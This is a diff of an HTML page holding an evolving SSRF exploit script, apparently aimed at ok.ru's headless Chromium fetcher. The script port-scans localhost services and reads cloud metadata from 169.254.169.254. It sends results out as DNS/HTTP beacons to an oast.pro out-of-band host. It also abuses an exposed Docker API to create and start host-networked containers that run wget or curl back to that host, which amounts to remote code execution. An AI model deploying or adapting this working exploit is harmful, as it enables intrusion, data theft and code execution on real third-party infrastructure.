@@ -4,88 +4,95 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v9 (fire-and-forget: no await, iframe navs survive render timeout)
-// KEY INSIGHT: form.submit() to iframe is a browser-level navigation — survives JS timeout
-// Strategy: fire ALL requests in <100ms synchronously, no awaiting anything
-// setTimeout handles create→start sequencing without blocking main thread
+// ok.ru Chromium SSRF — probe v10
+// FIX: HTTP OOB (not HTTPS) — eliminates TLS cold-start latency for sync signals
+// NEW: scan 127.0.0.1 (fetcher localhost), port 4243, cloud metadata 169.254.169.254
+// RCE form-POSTs target both 127.0.0.1 and 172.17.0.1 on ports 2375+4243
 
 const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
-const T0 = Date.now();
-
 const clean = (s) => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
 
-// Use only new Image().src — no fetch() wrapper needed (fetch itself adds latency)
-const dnsOob = (label) => { new Image().src = `https://${clean(label)}.${OOB}/`; };
+// HTTP OOB — no TLS overhead, arrives in <30ms
+const oob = (label) => { new Image().src = `http://${clean(label)}.${OOB}/`; };
 
-// Fire-and-forget form POST — no await, iframe navigation is independent of JS timeout
-const ffPost = (lp, url, jsonBody) => {
-  try {
-    const ifr = document.createElement('iframe');
-    ifr.name = `ifr${lp}`;
-    ifr.style.display = 'none';
-    document.body.appendChild(ifr);
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = url;
-    form.enctype = 'text/plain';
-    form.target = `ifr${lp}`;
-    if (jsonBody !== null) {
-      const obj = { ...jsonBody, _x: '' };
-      const full = JSON.stringify(obj);
-      const split = full.lastIndexOf('"_x":"');
-      const inp = document.createElement('input');
-      inp.name = full.substring(0, split + 7);
-      inp.value = '"}';
-      form.appendChild(inp);
-    }
-    document.body.appendChild(form);
-    dnsOob(`${lp}s`);
-    form.submit();
-  } catch(e) { dnsOob(`${lp}x`); }
+// Port scan via no-cors fetch: -o=open(TCP connected), -t=TimeoutError(filtered/DROP), -e=TypeError(RST/CORS)
+const scan = (tag, url, ms) => {
+  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms) })
+    .then(() => oob(`${tag}-o`))
+    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':'e'}`));
 };
 
-const rceCmd = `wget -q -T5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sk -m5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"; nslookup "rce-ok.${OOB}" 2>/dev/null`;
+// Fire-and-forget form POST to iframe (survives page kill; Docker accepts text/plain JSON)
+const ffPost = (id, url, body) => {
+  try {
+    const ifr = document.createElement('iframe');
+    ifr.name = `i${id}`; ifr.style.display='none';
+    document.body.appendChild(ifr);
+    const f = document.createElement('form');
+    f.method='POST'; f.action=url; f.enctype='text/plain'; f.target=`i${id}`;
+    if (body !== null) {
+      const raw = JSON.stringify({...body, _x:''});
+      const sp = raw.lastIndexOf('"_x":"');
+      const inp = document.createElement('input');
+      inp.name = raw.substring(0, sp+7);
+      inp.value = '"}';
+      f.appendChild(inp);
+    }
+    document.body.appendChild(f);
+    f.submit();
+  } catch(e) {}
+};
 
-// ── Main: everything fires synchronously in <50ms ──────────────────────────
-dnsOob(`v9s-${clean(navigator.userAgent.substring(0,25))}`);
+// ── Sync signals (arrive in <30ms with HTTP) ──
+oob(`v10-s-${clean(navigator.userAgent.substring(20,40))}`);
 
-const IP = '172.17.0.1';
-const PORT = 2375;
-const BASE = `http://${IP}:${PORT}/v1.41`;
+// ── Port scan: Docker API on 127.0.0.1 and 172.17.0.1 ──
+const DIPS = ['127.0.0.1', '172.17.0.1'];
+[2375, 4243].forEach(p => DIPS.forEach(ip => {
+  const tag = `dk${p}-${ip.replace(/\d+\.(\d+)$/,'$1')}`;
+  scan(tag, `http://${ip}:${p}/_ping`, 900);
+}));
 
-// Also probe with fetch (fire and forget, non-blocking)
-fetch(`${BASE}/_ping`, { signal: AbortSignal.timeout(2000) })
-  .then(r => { dnsOob(`dp-ok-${r.status}`); return r.text(); })
-  .then(b => dnsOob(`dp-body-${clean(b.substring(0,8))}`))
-  .catch(e => dnsOob(`dp-err-${clean((e.name||'u').substring(0,6))}`));
+// ── Scan other exploitable services on localhost ──
+[[6379,'r'],[8080,'h8'],[9090,'pm'],[10250,'kb'],[2379,'et'],[5001,'rg']].forEach(([p,n]) =>
+  scan(`svc${n}`, `http://127.0.0.1:${p}/`, 600)
+);
 
-fetch(`${BASE}/containers/json?all=1`, { signal: AbortSignal.timeout(2000) })
+// ── Cloud metadata — read via fetch (PNA may be disabled on this node) ──
+// OpenStack (VK Cloud uses this)
+fetch('http://169.254.169.254/openstack/2012-08-10/meta_data.json', {signal:AbortSignal.timeout(1500)})
   .then(r => r.text())
-  .then(b => {
-    dnsOob('cj-ok');
-    try {
-      const ctrs = JSON.parse(b);
-      dnsOob(`cj-cnt-${ctrs.length}`);
-      (ctrs.slice(0,2)).forEach(c => dnsOob(`cj-img-${clean((c.Image||'na').substring(0,15))}`));
-    } catch(e) {}
-  })
-  .catch(() => dnsOob('cj-err'));
+  .then(t => { oob('os-ok'); oob(`os-${clean(t.substring(0,30))}`); })
+  .catch(e => oob(`os-${clean((e.name||'e').substring(0,6))}`));
 
-// RCE: fire all creates immediately, starts via setTimeout (sequencing w/o blocking)
-const images = ['busybox', 'alpine', 'ubuntu', 'debian'];
-images.forEach((img, i) => {
-  const name = `r9${img.substring(0,3)}`;
-  const body = { Image: img, Cmd: ['sh','-c', rceCmd], HostConfig: { NetworkMode:'host', AutoRemove:true } };
-  dnsOob(`cr-${img.substring(0,4)}`);
-  ffPost(`c${i}`, `${BASE}/containers/create?name=${name}`, body);
-  // Start 800ms after create — enough time for Docker to process create before start
-  setTimeout(() => {
-    dnsOob(`st-${img.substring(0,4)}`);
-    ffPost(`s${i}`, `${BASE}/containers/${name}/start`, null);
-  }, 800 + i * 300);
-});
+// AWS-compatible (fallback)
+fetch('http://169.254.169.254/latest/meta-data/hostname', {signal:AbortSignal.timeout(1500)})
+  .then(r => r.text())
+  .then(t => { oob('aws-ok'); oob(`aws-${clean(t.substring(0,30))}`); })
+  .catch(e => oob(`aws-${clean((e.name||'e').substring(0,6))}`));
 
-dnsOob('v9-all-fired');
+// ── RCE: form-POST Docker create+start on all candidate targets ──
+const rceCmd = `nslookup rce-ok.${OOB}; wget -qT5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sm5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"`;
+
+let idx = 0;
+DIPS.forEach((ip,hi) => [2375,4243].forEach((p,pi) => {
+  const base = `http://${ip}:${p}/v1.41`;
+  ['busybox','alpine'].forEach((img,ii) => {
+    const nm = `v${hi}${pi}${ii}`;
+    const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
+    oob(`cr-${nm}-${img.substring(0,3)}`);
+    ffPost(`c${idx}`, `${base}/containers/create?name=${nm}`, bdy);
+    const t = 500 + idx*150;
+    const i2 = idx;
+    setTimeout(() => {
+      oob(`st-${nm}`);
+      ffPost(`s${i2}`, `${base}/containers/${nm}/start`, null);
+    }, t);
+    idx++;
+  });
+}));
+
+oob('v10-e');
 </script>
 </body>
 </html>
